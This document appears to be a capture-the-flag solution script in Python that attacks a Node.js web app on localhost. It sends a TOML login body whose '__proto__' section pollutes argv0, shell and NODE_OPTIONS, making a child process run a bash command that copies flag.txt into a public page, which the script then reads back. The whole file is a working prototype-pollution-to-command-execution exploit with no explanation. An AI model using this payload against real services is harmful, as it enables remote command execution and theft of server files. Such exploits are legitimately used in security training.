import requests
import re
import time 

domain = "localhost:80"
url = f"http://{domain}/"
headers = {
    "Host": f"{domain}",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
    "Content-Type": "text/plain",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close"
}

payload = '''
title = "userData"

[user]
name = "admin"
password = "admin"

[user.__proto__]
argv0 = "require('child_process').execSync(`bash -c 'cat flag.txt > ./public/pages/empty.html'`)//"
shell = "/proc/self/exe"
NODE_OPTIONS = "--require /proc/self/cmdline"
'''

def exploit():
    requests.post(url+'login', headers=headers, data=payload)
    time.sleep(3)
    resp = requests.get(url+'empty', headers=headers)
    print(re.search(r'ppfun{.*?}', resp.text).group(0))

if __name__ == '__main__':
    exploit()